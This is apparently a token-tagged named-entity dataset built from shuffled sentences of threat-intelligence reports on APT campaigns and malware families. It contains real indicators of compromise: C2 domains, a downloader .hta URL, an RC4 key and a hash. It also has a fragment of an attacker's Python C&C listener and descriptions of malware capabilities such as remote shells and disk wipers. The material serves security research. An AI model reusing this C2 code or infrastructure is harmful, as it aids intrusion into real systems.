have	O
also	O
to	O
a	O
lesser	O
extent	O
seen	O
IP	O
addresses	O
in	O
use	O
belonging	O
to	O
another	O
Paltel	O
division	O
:	O

From	O
the	O
recent	O
sendspace.servermsys.com/downloader.hta	O
:	O
After	O
execution	O
and	O
escaping	O
a	O
couple	O
of	O
variables	O
,	O
the	O
.hta	O
uses	O
ancient	O
Adodb.stream	O
components	O
in	O
order	O
to	O
write	O
out	O
a	O
string	O
xor	O
'd	O
with	O
0x3d	O
as	O
an	O
executable	O
file	O
and	O
runs	O
it	O
.	O

The	O
attackers	O
have	O
been	O
active	O
for	O
more	O
than	O
ten	O
years	O
.	O

Figure	O
19	O
:	O
Country	O
Code	O
Check	O

The	O
authors	O
wish	O
to	O
thank	O
the	O
researchers	O
behind	O
Operation	O
Hangover	O
,	O
whose	O
work	O
we	O
depended	O
heavily	O
upon	O
:	O
Snorre	O
Fagerland	O
,	O
Morten	O
Kråkvik	O
,	O
Jonathan	O
Camp	O
,	O
and	O
Ned	O
Moran	O
.	O

0x31	O
0x35	O
0x35	O
0x43	O
0x41	O
0x44	O
0x33	O
0x31	O
0x41	O
0x36	O
0x31	O
0x46	O
0x01	O
0x05	O
0x05	O
0x0C	O
0x0A	O
0x0D	O
0x03	O
0x01	O
0x0A	O
0x06	O
0x01	O
0x0F	O
0x10	O
0x10	O
0x30	O
0x50	O
0xA0	O
0xA0	O
0x15	O
0x5C	O
0xAD	O
0x31	O
0xA6	O
0x1F	O

replaced	O
by	O
u.cacheoffer[.]tk	O
)	O
:	O

Surprisingly	O
,	O
one	O
sample	O
of	O
the	O
Equation	O
APT	B-malware.unknown
campaign	O
(	O
fanny	O
worm	O
)	O
was	O
found	O
and	O
blocked	O
on	O
a	O
Cisco	O
AMP	O
customer	O
's	O
machine	O
a	O
day	O
after	O
the	O
public	O
release	O
of	O
the	O
Kaspersky	O
report	O
.	O

In	O
the	O
code	O
of	O
Python	O
script	O
,	O
attackers	O
left	O
their	O
comment	O
which	O
had	O
following	O
text	O
:	O

So	O
,	O
from	O
the	O
current	O
point	O
of	O
view	O
,	O
there	O
are	O
three	O
theories	O
:	O
The	O
attackers	O
who	O
developed	O
the	O
Kraken	B-malware.ransom
malware	O
might	O
have	O
chosen	O
to	O
diversify	O
their	O
business	O
and	O
chose	O
to	O
attack	O
special	O
interest	O
targets	O
themselves	O
.	O

All	O
but	O
one	O
sample	O
that	O
we	O
identified	O
were	O
written	O
to	O
this	O
folder	O
as	O
word.exe	O
.	O

Unfortunately	O
,	O
when	O
we	O
started	O
this	O
investigation	O
,	O
the	O
domain	O
is	O
now	O
pointing	O
to	O
an	O
IP	O
address	O
of	O
Google	O
and	O
returning	O
a	O
404	O
Not	O
Found	O
page	O
only	O
.	O

Shane	O
,	O
Scott	O
.	O

All	O
other	O
brands	O
,	O
products	O
,	O
or	O
service	O
names	O
are	O
or	O
may	O
be	O
trademarks	O
or	O
service	O
marks	O
of	O
their	O
respective	O
owners	O
.	O

Take	O
steps	O
to	O
further	O
secure	O
Windows	O
systems	O
such	O
as	O
installing	O
and	O
configuring	O
Microsoft	O
's	O
Enhanced	O
Mitigation	O
Experience	O
Toolkit	O
(	O
EMET	O
)	O
and	O
Microsoft	O
AppLocker	O
.	O

Below	O
screen	O
shot	O
shows	O
the	O
macro	O
code	O
accessing	O
the	O
content	O
from	O
the	O
TextBox	O
and	O
the	O
error	O
triggered	O
by	O
the	O
code	O
due	O
to	O
the	O
absence	O
of	O
the	O
TextBox	O
content	O
.	O

In	O
all	O
CozyDuke	B-malware.drop
samples	O
from	O
2015	O
,	O
the	O
configuration	O
data	O
has	O
been	O
encrypted	O
with	O
the	O
RC4	O
key	O
B5	O
78	O
62	O
52	O
98	O
3E	O
24	O
D7	O
3B	O
C6	O
EE	O
7C	O
B9	O
ED	O
91	O
62	O
.	O

However	O
these	O
attacks	O
also	O
leverage	O
trusted	O
channels	O
into	O
the	O
eventual	O
target	O
,	O
e.g.	O
,	O
through	O
a	O
trusted	O
supplier	O
,	O
allowing	O
attackers	O
to	O
potentially	O
circumvent	O
security	O
systems	O
at	O
the	O
organization	O
they	O
ultimately	O
wish	O
to	O
compromise	O
.	O

The	O
downloaded	O
executable	O
is	O
saved	O
in	O
the	O
%	O
AppData	O
%	O
\SQLite	O
directory	O
as	O
shown	O
in	O
the	O
below	O
screen	O
shot	O
.	O

Network	O
based	O
indications	O
of	O
possible	O
compromise	O
by	O
the	O
comment	O
crew	O
attackers	O
.	O

Heavy	O
obfuscation	O
or	O
the	O
use	O
of	O
crypters	O
easily	O
raises	O
suspicion	O
of	O
heuristics	O
based	O
malware	O
scanners	O
.	O

Dark	O
Seoul	O
(	O
2013	O
)	O

Insikt	O
Group	O
analyzed	O
internet	O
traffic	O
relating	O
to	O
various	O
institutes	O
affiliated	O
with	O
the	O
Iranian	O
cyber	O
ecosystem	O
from	O
March	O
1	O
,	O
2018	O
to	O
April	O
30	O
,	O
2018	O
.	O

AIS	O
participants	O
connect	O
to	O
a	O
DHS-managed	O
system	O
in	O
the	O
NCCIC	O
that	O
allows	O
bidirectional	O
sharing	O
of	O
cyber	O
threat	O
indicators	O
.	O

And	O
second	O
is	O
'	O
philip.varilla	O
'	O
.	O

The	O
attackers	O
could	O
visit	O
websites	O
that	O
are	O
regarded	O
as	O
illegal	O
in	O
the	O
respective	O
country	O
and	O
could	O
then	O
ask	O
for	O
ransom	O
and	O
threaten	O
to	O
release	O
information	O
about	O
the	O
alleged	O
violation	O
to	O
any	O
seemingly	O
official	O
entity	O
who	O
would	O
then	O
investigate	O
against	O
the	O
victim	O
.	O

Exactly	O
the	O
same	O
method	O
was	O
used	O
in	O
the	O
WannaCryptor.D	O
ransomware	O
.	O

This	O
section	O
contains	O
the	O
details	O
of	O
the	O
C2	O
domain	O
(	O
khanji[.]ddns[.]net	B-url.cncsvr
)	O
.	O

s.listen	O
(	O
1	O
)	O
29.	O
print	O
'	O
[	O
*	O
]	O
C	O
&	O
C	O
Running	O
on	O
0.0.0.0:443	O
'	O
32.	O
while	O
True	O
:	O
33.	O
s2	O
,	O
ca	O
=	O
s.accept	O
(	O
)	O
34.	O
print	O
'	O
[	O
+	O
]	O
New	O
client	O
connected	O
:	O
'	O
,	O
ca	O
36.	O
while	O
True	O
:	O
37.	O
dec	O
=	O
'	O
'	O
38.	O
rlist	O
,	O
wlist	O
,	O
xlist	O
=	O
select.select	O
(	O
[	O
s2	O
,	O
]	O
,	O
[	O
]	O
,	O
[	O
]	O
,	O
10	O
)	O
39.	O
while	O
rlist	O
:	O
40.	O
data	O
=	O
s2.recv	O
(	O
2048	O
)	O
41.	O
if	O
not	O
data	O
:	O
break	O
44.	O
dec	O
=	O
decode	O
(	O
data	O
)	O
45.	O
print	O
dec	O
46.	O
rlist	O
,	O
wlist	O
,	O
xlist	O
=	O
select.select	O
(	O
[	O
s2	O
,	O
]	O
,	O
[	O
]	O
,	O
[	O
]	O
,	O
2	O
)	O
49.	O
if	O
dec.startswith	O
(	O
'	O
$	O
login	O
$	O
'	O
)	O
:	O
50.	O
print	O
'	O
[	O
+	O
]	O
Authenticating	O
on	O
the	O
bot	O
'	O
51	O
.	O

The	O
following	O
factors	O
in	O
this	O
cyber	O
attack	O
suggests	O
the	O
possible	O
involvement	O
of	O
Pakistan	O
state	O
sponsored	O
cyber	O
espionage	O
group	O
to	O
mainly	O
spy	O
on	O
India	O
's	O
actions	O
related	O
to	O
these	O
Geo-political	O
events	O
(	O
Uri	O
terror	O
attack	O
and	O
Jammu	O
&	O
Kashmir	O
protests	O
)	O
.	O

C	O
&	O
C	O
:	O

This	O
malware	O
has	O
two	O
routines	O
that	O
we	O
could	O
find	O
no	O
other	O
purpose	O
than	O
for	O
such	O
an	O
evasion	O
.	O

An	O
interesting	O
feature	O
of	O
this	O
malware	O
is	O
that	O
it	O
has	O
components	O
to	O
wipe	O
out	O
harddisks	O
on	O
both	O
Windows	O
and	O
Linux	O
platforms	O
.	O

Based	O
on	O
its	O
code	O
,	O
this	O
malware	O
is	O
capable	O
of	O
executing	O
the	O
following	O
commands	O
from	O
the	O
hacker	O
:	O
·	O
Create	O
,	O
read	O
,	O
write	O
files	O
·	O
Download	O
and	O
execute	O
files/components	O
·	O
Launch	O
remote	O
shell	O
using	O
cmd.exe	O
While	O
other	O
APT	O
backdoors	O
have	O
more	O
capabilities	O
,	O
such	O
as	O
keylogging	O
,	O
taking	O
screen	O
shots	O
,	O
etc.	O
,	O
Hussarini	B-malware.backdoor
only	O
has	O
few	O
,	O
including	O
the	O
capability	O
to	O
download	O
and	O
execute	O
files/components	O
.	O

Data	O
:	O
Ups	O
?	O
?	O
?	O

Introduction	O
and	O
Prior	O
Research	O
........................................................................................................................................................................................................................................................	O
3	O

Table	O
2	O
.	O

A	O
strange	O
file	O
was	O
discovered	O
on	O
the	O
victim	O
's	O
computer	O
,	O
which	O
was	O
detected	O
by	O
our	O
antivirus	O
engine	O
as	O
Rootkit.Win32.Stuxnet.a	O
.	O

Additionally	O
,	O
the	O
application	O
was	O
initially	O
developed	O
by	O
a	O
member	O
of	O
the	O
Ukrainian	O
army	O
.	O

Malware	O
Package	O
6	O
.	O

Additionally	O
,	O
we	O
discovered	O
web	O
control	O
panels	O
for	O
several	O
different	O
commodity	O
RATs	O
located	O
under	O
directories	O
that	O
appeared	O
to	O
be	O
code-names	O
for	O
different	O
operations	O
(	O
Fig	O
11	O
)	O
.	O

1	O
20120426	O
20130311	O
52284	O
200.63.46.0/24	O
2	O
http://bgpranking.circl.lu	O
/asn_details	O
?	O
asn=52284	O
&	O
source=	O
&	O
date=	O

The	O
droppers	O
are	O
probably	O
attached	O
to	O
an	O
email	O
message	O
.	O

The	O
particular	O
version	O
we	O
analyzed	O
was	O
NewCT	O
version	O
2	O
.	O

The	O
site	O
was	O
up	O
and	O
active	O
as	O
late	O
as	O
22	O
July	O
,	O
2015	O
.	O

It	O
is	O
the	O
client	O
's	O
handshake	O
that	O
the	O
driver	O
for	O
the	O
server	O
variant	O
triggers	O
off	O
of	O
.	O

A	O
)	O
,	O
discovered	O
in	O
June	O
2017	O
,	O
that	O
uses	O
a	O
PowerShell	O
script	O
instead	O
of	O
its	O
more	O
traditional	O
PE	O
executable	O
form—a	O
version	O
that	O
other	O
researchers	O
also	O
recently	O
identified	O
.	O

With	O
a	O
standard	O
Snort	O
IDS	O
in	O
place	O
,	O
this	O
traffic	O
can	O
be	O
caught	O
with	O
relative	O
ease	O
.	O

Advanced	O
Malware	O
Protection	O
(	O
AMP	O
)	O
is	O
ideally	O
suited	O
to	O
prevent	O
the	O
execution	O
of	O
the	O
malware	O
used	O
by	O
these	O
threat	O
actors	O
.	O

Figure	O
8	O
.	O

In	O
late	O
June	O
and	O
August	O
2016	O
,	O
CrowdStrike	O
Intelligence	O
provided	O
initial	O
reporting	O
and	O
technical	O
analysis	O
of	O
a	O
variant	O
of	O
the	O
FANCY	O
BEAR	O
implant	O
X-Agent	B-malware.infosteal
that	O
targeted	O
the	O
Android	O
mobile	O
platform	O
.	O

FACTORS	O

19	O
,	O
2018	O
,	O
2:56	O
p.m.	O
)	O
:	O
Decoy	O
Document	O
The	O
Word	O
document	O
,	O
which	O
includes	O
information	O
on	O
ADMM-Plus	O
members	O
,	O
has	O
a	O
malicious	O
executable	O
file	O
embedded	O
as	O
an	O
OLE	O
object	O
(	O
see	O
Exhibit	O
2	O
)	O
.	O

If	O
scada.exe	B-malware.unknown
finds	O
a	O
matching	O
DLL	O
file	O
name	O
,	O
it	O
kills	O
all	O
running	O
processes	O
with	O
the	O
name	O
biogas.exe	O
.	O

?	O
1	O
?	O
0	O
ff	O
15	O
?	O
?	O

For	O
example	O
,	O
many	O
in	O
the	O
Syrian	O
opposition	O
are	O
now	O
aware	O
of	O
the	O
electronic	O
threats	O
they	O
face	O
and	O
seek	O
out	O
tools	O
to	O
increase	O
their	O
communications	O
security	O
and	O
privacy	O
.	O

Mandiant	O
confirmed	O
that	O
,	O
after	O
correcting	O
patching	O
the	O
attack	O
script	O
to	O
remove	O
this	O
check	O
,	O
the	O
payload	O
binary	O
would	O
persist	O
in	O
controller	O
memory	O
,	O
and	O
the	O
controller	O
would	O
continue	O
to	O
run	O
.	O

29	O
Dec	O
.	O

According	O
to	O
various	O
sources	O
,	O
there	O
are	O
estimates	O
suggesting	O
that	O
,	O
in	O
greater	O
Crimea	O
80	O
%	O
speak	O
Russian	O
,	O
10	O
%	O
speak	O
Ukrainian	O
,	O
and	O
10	O
%	O
speak	O
Tatar	O
.	O

It	O
's	O
interesting	O
that	O
the	O
same	O
'	O
rsh	O
!	O

Organizations	O
can	O
implement	O
various	O
techniques	O
and	O
best	O
practices	O
to	O
defend	O
against	O
targeted	O
attacks	O
,	O
such	O
as	O
regular	O
patching	O
to	O
prevent	O
vulnerability	O
exploitation	O
and	O
using	O
tools	O
that	O
provide	O
protection	O
across	O
different	O
network	O
levels	O
.	O

The	O
cache	O
filename	O
will	O
be	O
retrieved	O
and	O
opened	O
to	O
retrieve	O
the	O
payload	O
from	O
the	O
C	O
&	O
C	O
server	O
.	O

In	O
this	O
APT	O
,	O
the	O
threat	O
actor	O
was	O
very	O
aware	O
of	O
the	O
risks	O
of	O
exposure	O
and	O
tried	O
to	O
combat	O
attribution	O
as	O
much	O
as	O
possible	O
.	O

Payment	O
Invoice.jar	O

Dubbed	O
Operation	O
Cobalt	O
Kitty	O
,	O
the	O
APT	O
targeted	O

Those	O
strings	O
helped	O
us	O
find	O
other	O
websites	O
that	O
use	O
the	O
same	O
template	O
,	O
and	O
while	O
they	O
could	O
not	O
be	O
linked	O
to	O
specific	O
malware	O
samples	O
,	O
it	O
is	O
possible	O
that	O
they	O
will	O
be	O
used	O
in	O
the	O
future	O
.	O

7	O
)	O
,	O
the	O
extra	O
field	O
begins	O
at	O
offset	O
of	O
the	O
file	O
header	O
for	O
a	O
given	O
file	O
in	O
the	O
compressed	O
JAR	O
.	O

In	O
2010	O
,	O
the	O
authors	O
created	O
the	O
second	O
driver	O
mrxnet.sys	O
(	O
to	O
hide	O
the	O
worm	O
's	O
component	O
files	O
on	O
USB	O
drives	O
)	O
and	O
equipped	O
mrxnet.sys	O
and	O
mrxcls.sys	O
drivers	O
with	O
digital	O
certificates	O
from	O
Realtek	O
.	O

The	O
group	O
includes	O
members	O
who	O
are	O
fluent	O
in	O
at	O
least	O
two	O
Asian	O
languages	O
.	O

SQLite.exe	O
to	O
%	O
AppData	O
%	O
\SQLite	O
directory	O
as	O
shown	O
below	O
.	O

The	O
process	O
chain	O
is	O
shown	O
in	O
Figure	O
2	O
.	O

10:27	O
am	O
During	O
the	O
latter	O
part	O
of	O
2015	O
,	O
Kaspersky	O
researchers	O
from	O
GReAT	O
(	O
Global	O
Research	O
and	O
Analysis	O
Team	O
)	O
got	O
hold	O
of	O
the	O
missing	O
pieces	O
of	O
an	O
intricate	O
puzzle	O
that	O
points	O
to	O
the	O
dawn	O
of	O
the	O
first	O
Portuguese­speaking	O
targeted	O
attack	O
group	O
,	O
named	O
'	O
Poseidon	B-malware.infosteal
.	O
'	O

This	O
uses	O
an	O
interesting	O
bug	O
in	O
the	O
Windows	O
DDE	O
component	O
.	O

was	O
executed	O
with	O
krv	O
as	O
the	O
first	O
parameter	O
.	O

Adobe	O
acted	O
quickly	O
to	O
coordinate	O
with	O
ICEBRG	O
,	O
reproduce	O
the	O
vulnerability	O
,	O
and	O
distribute	O
a	O
patch	O
for	O
its	O
software	O
on	O
June	O
7	O
,	O
2018	O
.	O

Samples	O
#	O
2-4	O
were	O
also	O
separately	O
uploaded	O
by	O
users	O
in	O
Taiwan	O
and	O
the	O
US	O
on	O
the	O
dates	O
given	O
above	O
.	O

Some	O
of	O
the	O
targets	O
are	O
diplomatic	O
or	O
have	O
strategic	O
commercial	O
interests	O
.	O

FireEye	O
has	O
invented	O
a	O
purpose-built	O
,	O
virtual	O
machine-based	O
security	O
platform	O
that	O
provides	O
realtime	O
threat	O
protection	O
to	O
enterprises	O
and	O
governments	O
worldwide	O
against	O
the	O
next	O
generation	O
of	O
cyber	O
attacks	O
.	O

After	O
the	O
raw	O
source	O
buffer	O
has	O
been	O
converted	O
from	O
ASCII	O
form	O
to	O
integer	O
form	O
,	O
the	O
next	O
substantive	O
code	O
block	O
initializes	O
a	O
256-element	O
array	O
stable_var_41C	O
:	O

There	O
is	O
no	O
clue	O
on	O
the	O
functionality	O
of	O
purpose	O
of	O
the	O
binary	O
by	O
just	O
looking	O
at	O
the	O
string	O
's	O
table	O
.	O

漏洞分析	O
(	O
38	O
)	O

OS	O
version	O

0-day	O
exploits	O
are	O
written	O
to	O
exploit	O
vulnerabilities	O
that	O
have	O
not	O
been	O
disclosed	O
to	O
the	O
public	O
nor	O
the	O
concerned	O
software	O
vendor	O
.	O

Due	O
to	O
expensive	O
work	O
of	O
malware	O
with	O
variety	O
of	O
additional	O
files	O
,	O
it	O
's	O
not	O
out	O
of	O
place	O
to	O
show	O
these	O
'	O
relationships	O
'	O
in	O
a	O
diagram	O
:	O
This	O
module	O
intercepts	O
HWP	O
documents	O
on	O
an	O
infected	O
computer	O
.	O

The	O
malware	O
supports	O
up	O
to	O
8	O
different	O
modules	O
per	O
sample	O
with	O
each	O
module	O
designating	O
its	O
own	O
ID	O
code	O
.	O

The	O
first	O
resource	O
,	O
0x000A	O
,	O
contains	O
as	O
its	O
payload	O
a	O
Microsoft	O
cabinet	O
archive	O
.	O

Failed	O
exploit	O
attempts	O
may	O
result	O
in	O
an	O
application	O
crash	O
(	O
denial	O
of	O
service	O
)	O
.	O

MP4	O
video	O
contained	O
in	O
EXE	O
file	O
2AAD951DBECB6D4715B306B337CA5C34	B-hash

Table	B-malware.unknown
1	O
CVE­2011­0611	O
CVE­2012­0158	O
CVE­2009­0927	O
CVE­2010­3333	O
CVE­2012­0754	O
malware	O
uses	O
a	O
well­documented	O
vulnerability	O
in	O
the	O
Windows	O
OS	O
known	O
as	O
DLL	O
search	O
order	O
hijacking	O
.	O

Figure	O
4	O
:	O
Code	O
snippet	O
that	O
is	O
linked	O
from	O
OpenSSL	O
library	O
Figure	O
5	O
:	O
Op	O
code	O
in	O
the	O
instructions	O
Figure	O
7	O
:	O
OpenSSL	O
functions	O

If	O
any	O
of	O
the	O
instances	O
dies	O
,	O
a	O
new	O
third	O
instance	O
will	O
be	O
created	O
.	O

Companies	O
selling	O
surveillance	O
and	O
intrusion	O
software	O
commonly	O
claim	O
that	O
their	O
tools	O
are	O
only	O
used	O
to	O
track	O
criminals	O
and	O
terrorists	O
.	O

The	O
first	O
actor	O
group	O
,	O
known	O
as	O
Advanced	O
Persistent	O
Threat	O
(	O
APT	O
)	O
29	O
,	O
entered	O
into	O
the	O
party	O
's	O
systems	O
in	O
summer	O
2015	O
,	O
while	O
the	O
second	O
,	O
known	O
as	O
APT28	B-malware.backdoor
,	O
entered	O
in	O
spring	O
2016	O
.	O

Mystery	O
Cluster	O
3	O
(	O
aka	O
Cluster	O
3	O
,	O
centered	O
on	O
qoog1e[.]com	B-url.unknown
)	O
:	O

This	O
post	O
was	O
authored	O
by	O
Andrea	O
Allievi	O
,	O
Douglas	O
Goddard	O
,	O
Shaun	O
Hurley	O
,	O
and	O
Alain	O
Zidouemba	O
.	O

The	O
initial	O
dropper	O
is	O
merely	O
a	O
detonation	O
package	O
that	O
decompresses	O
an	O
embedded	O
DLL	O
into	O
the	O
Windows	O
system32	O

function	O
.	O

Based	O
on	O
analysis	O
of	O
previous	O
samples	O
,	O
this	O
is	O
a	O
unique	O
identifier	O
.	O

All	O
this	O
data	O
is	O
merged	O
in	O
one	O
file	O
xmlrwbin.inc	O
,	O
which	O
is	O
then	O
encrypted	O
with	O
RC4	O
.	O

Once	O
loaded	O
as	O
a	O
service	O
DLL	O
,	O
the	O
DLL	O
's	O
export	O
ServiceMain	O
(	O
)	O
is	O
called	O
.	O

Both	O
sample	O
#	O
4	O
and	O
#	O
6	O
have	O
the	O
same	O
time	O
stamp	O
:	O
20	O
February	O
2017	O
,	O
11:09:30	O
.	O

Implementing	O
the	O
use	O
of	O
free	O
dynamic	O
DNS	O
services	O
,	O
such	O
as	O
those	O
of	O
NO-IP	O
within	O
targeting	O
and	O
exploitation	O
phases	O
of	O
attack	O
,	O
are	O
very	O
common	O
techniques	O
used	O
by	O
a	O
variety	O
sophisticated	O
threat	O
groups	O
.	O

This	O
suggested	O
the	O
attacker	O
had	O
already	O
compromised	O
other	O
systems	O
in	O
the	O
environment	O
and	O
was	O
using	O
an	O
internal	O
C2	O
mechanism	O
for	O
a	O
fallback	O
.	O

Following	O
the	O
first	O
five	O
bytes	O
,	O
the	O
packet	O
then	O
shows	O
the	O
full	O
packet	O
size	O
and	O
the	O
uncompressed	O
data	O
size	O
.	O

Public	O
and	O
private	O
sectors	O
alike	O
should	O
begin	O
to	O
increase	O
their	O
awareness	O
of	O
emerging	O
cyber	O
threats	O
from	O
the	O
lesser-known	O
middle	O
powers	O
.	O

It	O
also	O
provides	O
visibility	O
to	O
network-wide	O
security	O
events	O
.	O

However	O
,	O
more	O
significant	O
changes	O
can	O
be	O
found	O
in	O
several	O
functions	O
:	O
1	O
.	O

Since	O
it	O
is	O
operating	O
on	O
the	O
8-bit	O
register	O
AL	O
,	O
the	O
result	O
is	O
that	O
source	O
bytes	O
with	O
values	O
of	O
0x3A	O
or	O
greater	O
will	O
be	O
processed	O
by	O
one	O
branch	O
,	O
and	O
those	O
with	O
values	O
of	O
0x39	O
and	O
less	O
will	O
be	O
processed	O
by	O
a	O
second	O
branch	O
:	O

This	O
command	O
was	O
implemented	O
by	O
Microsoft	O
in	O
Windows	O
Vista	O
in	O
2007	O
.	O

-	O
downloads	O
a	O
file	O
#	O
runfile-	O
-	O
executes	O
a	O
file	O
on	O
the	O
system	O
via	O
CreateProcess	O
API	O
#	O
urldownload	O
?	O

Command	O
code	O
Description	O

This	O
has	O
been	O
noted	O
by	O
others	O
in	O
the	O
community	O
as	O
well	O
,	O
specifically	O
that	O
Administrator	O
access	O
is	O
needed	O
for	O
initially	O
launching	O
Shamoon	B-malware.unknown
.	O

It	O
parses	O
the	O
messages	O
,	O
looking	O
for	O
strings	O
defined	O
in	O
gpca.dat	O
.	O

executeShellCommand	O
:	O
]	O

FileTokenBroker.dll	O
is	O
a	O
DLL	O
,	O
installed	O
as	O
a	O
service	O
under	O
the	O
svchost.exe	O
(	O
netsvcs	O
)	O
service	O
host	O
.	O

Each	O
byte	O
of	O
the	O
key	O
is	O
generated	O
using	O
the	O
rand	O
function	O
.	O

His	O
dynamic	O
DNS	O
service	O
hosts	O
over	O
1	O
million	O
domain	O
names	O
.	O

A	O
full	O
technical	O
report	O
,	O
IoCs	O
and	O
YARA	O
rules	O
are	O
available	O
from	O
our	O
intelligence	O
reporting	O
service	O
(	O
contact	O
us	O
intelligence@kaspersky.com	O
)	O
.	O

During	O
the	O
incident	O
,	O
some	O
SIS	O
controllers	O
entered	O
a	O
failed	O
safe	O
state	O
,	O
which	O
automatically	O
shutdown	O
the	O
industrial	O
process	O
and	O
prompted	O
the	O
asset	O
owner	O
to	O
initiate	O
an	O
investigation	O
.	O

As	O
the	O
project	O
name	O
'	O
Babar64	B-malware.drop
'	O
suggests	O
,	O
dropper	O
and	O
implant	O
are	O
designed	O
to	O
work	O
on	O
32-bit	O
and	O
on	O
64-bit	O
Windows	O
versions	O
.	O

In	O
addition	O
,	O
a	O
custom	O
Python	O
script	O
named	O
ftpChecker.py	O
was	O
found	O
on	O
one	O
of	O
the	O
servers	O
.	O

This	O
is	O
a	O
publicly	O
available	O
RAT	O
used	O
by	O
multiple	O
threat	O
actors	O
,	O
which	O
has	O
been	O
extensively	O
analyzed	O
in	O
a	O
previous	O
FireEye	O
white	O
paper	O
12	O
.	O

However	O
,	O
the	O
selection	O
is	O
n't	O
frequently	O
seen	O
.	O

Since	O
then	O
we	O
have	O
encountered	O
24	O
additional	O
sites	O
compromised	O
with	O
the	O
framework	O
.	O

It	O
receives	O
a	O
base64	O
encoded	O
cmdPacket	O
that	O
has	O
previously	O
been	O
encrypted	O
with	O
RC4	O
using	O
a	O
hardcoded	O
KERNEL_CRYPTO_MAIN_KEY	O
.	O

Communication	O
is	O
encrypted	O
over	O
HTTP	O
,	O
port	O
443	O
,	O
obfuscated	O
with	O
a	O
weak	O
encryption	O
scheme	O
.	O

Targeted	O
attacks	O
discovered	O
by	O
region	O

Figure	O
6	O
–	O
Information	O
about	O
Tor	O
relay	O
run	O
by	O
the	O
TeleBots	O
group	O
.	O

A	O
pop-up	O
appears	O
when	O
the	O
attacker	O
pushes	O
a	O
new	O
app	O
to	O
the	O
user	O
device	O
.	O

A	O
tangled	O
web	O
of	O
malware	O

One	O
final	O
note	O
regarding	O
the	O
encryption	O
key	O
strings	O
used	O
by	O
DarkComet	B-malware.backdoor
:	O
as	O
first	O
documented	O
in	O
Contextis	O
'	O
Laura	O
Aylward	O
's	O
DarkComet	B-malware.backdoor
analysis	O
,	O
each	O
version	O
of	O
DarkComet	B-malware.backdoor
uses	O
a	O
different	O
hard-coded	O
string	O
for	O
the	O
key	O
prefix	O
.	O

Replacing	O
this	O
infrastructure	O
in	O
48	O
hours	O
suggests	O
that	O
the	O
threat	O
actors	O
were	O
prepared	O
for	O
such	O
a	O
scenario	O
.	O

The	O
mainLoop	O
function	O
begins	O
by	O
loading	O
the	O
unique	O
infection	O
ID	O
for	O
the	O
victim	O
's	O
machine	O
from	O
the	O
registry	O
(	O
under	O
the	O
key	O
value	O
located	O
at	O
HKLM\SOFTWARE\Microsoft\Rpc\Security	O
)	O
.	O

s2.close	O
(	O
)	O
63	O
.	O

Figure	O
20	O
:	O
Fiddler	O
mutex	O
check	O

In	O
the	O
past	O
two	O
weeks	O
,	O
we	O
have	O
observed	O
an	O
increase	O
in	O
attack	O
activity	O
against	O
the	O
U.S.	O
state	O
and	O
local	O
government	O
,	O
technology	O
,	O
advisory	O
services	O
,	O
health	O
,	O
and	O
financial	O
sectors	O
through	O
phishing	O
emails	O
with	O
what	O
appears	O
to	O
be	O
a	O
remote	O
access	O
trojan	O
(	O
RAT	B-malware.backdoor
)	O
known	O
as	O
Unrecom	B-malware.backdoor
.	O

APT28	O
has	O
a	O
rich	O
arsenal	O
composed	O
of	O
a	O
large	O
number	O
of	O
modular	O
threats	O
and	O
the	O
dll	B-malware.backdoor
is	O
the	O
component	O
of	O
the	O
X-Agent	B-malware.backdoor
we	O
analyzed	O
.	O

Since	O
its	O
debut	O
,	O
this	O
malware	O
has	O
been	O
targeting	O
important	O
institutions	O
,	O
mainly	O
in	O
Asia	O
and	O
the	O
USA	O
,	O
the	O
victims	O
being	O
part	O
of	O
Government	O
sector	O
,	O
Technology	O
,	O
Education	O
and	O
Telecommunications	O
.	O

By	O
default	O
,	O
the	O
XtremeRAT	B-malware.backdoor
controller	O
sets	O
the	O
ID	O
field	O
as	O
'	O
Server	O
'	O
and	O
Group	O
field	O
as	O
'	O
Servers	O
'	O
,	O
with	O
the	O
default	O
password	O
used	O
to	O
authenticate	O
,	O
connect	O
,	O
and	O
control	O
a	O
compromised	O
endpoint	O
as	O
'	O
1234567890	O
'	O
.	O

In	O
both	O
cases	O
,	O
we	O
did	O
not	O
send	O
any	O
information	O
to	O
the	O
attackers	O
.	O

Impacket	O
—	O
a	O
toolset	O
for	O
working	O
with	O
various	O
network	O
protocols	O
,	O
which	O
is	O
required	O
by	O
SMBT	O
rap	O
.	O

Due	O
to	O
this	O
it	O
was	O
possible	O
to	O
make	O
a	O
complete	O
recovery	O
of	O
Shamoon-infected	B-malware.unknown
file	O
systems	O
to	O
the	O
state	O
they	O
were	O
in	O
before	O
the	O
wiping	O
made	O
the	O
OS	O
unbootable	O
and	O
unreadable	O
.	O

(	O
Flash	O
Vulnerability	O
CVE-2016-7855	O
and	O
Windows	O
Vulnerability	O
CVE-2016-7255	O
were	O
exploited	O
as	O
zero	O
days	O
to	O
install	O
malware	O
on	O
victims	O
who	O
visited	O
a	O
malicious	O
URL	O
)	O
.	O

Exploit	O
:	O

This	O
integer	O
is	O
passed	O
to	O
a	O
standard	O
integer-to-string	O
API	O
,	O
which	O
writes	O
the	O
string	O
890	O
into	O
the	O
output	O
buffer	O
.	O

2017	O
.	O

Persistence	O
is	O
achieved	O
using	O
the	O
Run	O
Registry	O
key	O
with	O
the	O
value	O
name	O
IAStorD	O
:	O
HKCU\Software\Microsoft\Windows\CurrentVersion\Run\IAStorD	O
As	O
mentioned	O
earlier	O
,	O
two	O
hidden	O
DLLs	O
can	O
be	O
discovered	O
that	O
are	O
additionally	O
injected	O
into	O
iexplore.exe	O
and	O
have	O
the	O
export	O
functions	O
named	O
DePatchEntry	O
or	O
EvilEntry	O
.	O

Recently	O
,	O
ANTIY	O
Labs	O
detected	O
an	O
APT	O
attack	O
targeting	O
some	O
government	O
agency	O
in	O
China	O
.	O

The	O
digital	O
certificate	O
for	O
Blik	O
used	O
in	O
this	O
case	O
is	O
not	O
the	O
only	O
link	O
between	O
Win32/Spy.Agent.ORM	B-malware.infosteal
and	O
Win32/Spy.Sekur	O
(	O
Carbanak	B-malware.infosteal
malware	O
)	O
.	O

DllMain	O
performs	O
the	O
initialization	O
of	O
ZxShell	B-malware.backdoor
.	O

Cyberkov	O
Co	O
.	O

We	O
managed	O
to	O
get	O
a	O
copy	O
of	O
the	O
file	O
,	O
and	O
we	O
were	O
amazed	O
to	O
find	O
that	O
it	O
used	O
the	O
same	O
Realtek	O
certificate	O
,	O
but	O
with	O
a	O
different	O
file	O
signing	O
date	O
from	O
mrxcls.sys	O
:	O
rtniczw.sys	O
was	O
signed	O
on	O
18	O
March	O
2010	O
,	O
while	O
the	O
mrxcls	O
driver	O
